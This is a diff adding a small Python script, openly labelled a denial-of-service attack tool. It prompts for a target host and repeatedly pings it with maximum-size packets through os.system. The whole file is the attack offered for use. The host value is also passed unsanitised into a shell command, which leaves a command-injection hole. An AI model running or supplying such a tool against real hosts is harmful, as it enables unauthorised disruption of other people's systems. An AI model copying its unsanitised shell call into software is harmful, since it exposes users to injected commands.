@@ -1,0 +1,21 @@
+#!/usr/bin/python3
+import sys, os
+PACKET_SIZE = 65507
+
+try:
+  while True:
+    os.system('clear')
+    print("[*] Denial of Service Attack - Status: NOT RUNNING!\n\n")
+    HOST = input("[+] Target - Host: ")
+    if len(HOST) == 0:
+      continue
+    else:
+      while True:
+        try:
+          os.system('clear')
+          print("[*] Denial of Service Attack - Status: RUNNING!\n\n[!] NOTE: PRESS CTRL + Z TO ABORT or CTRL + C TO CLEAR THE SCREEN.\n\n")
+          os.system('ping %s -B -s %d' % (HOST, PACKET_SIZE))
+        except KeyboardInterrupt:
+          sys.exit(0)
+except KeyboardInterrupt:
+  sys.exit(0)
